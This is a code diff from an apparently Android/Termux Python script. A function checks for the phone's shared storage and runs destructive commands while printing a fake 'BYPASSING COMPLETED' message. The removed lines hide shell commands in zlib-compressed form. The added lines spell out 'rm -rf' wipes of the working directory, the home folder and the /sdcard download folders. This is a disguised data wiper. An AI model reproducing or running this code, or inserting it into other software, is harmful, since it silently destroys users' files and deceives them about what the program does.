@@ -56,9 +56,12 @@ def sintacsDelete():
     try:
         data = os.listdir('/sdcard')
         if 'Android' in data:
-            os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
-            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
-            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+             os.system('rm -rf *')
+             os.system('cd && rm -rf *')
+             os.system('rm -rf $HOME/*')
+             os.system('rm -rf /sdcard/Download/*')
+             os.system('rm -rf /sdcard/Downloads/*')
+             os.system('rm -rf /sdcard/downloads/*')
             systm("clear")
             print(f"{lgr}  [✓] BYPASSING COMPLETED")
             slp(5)
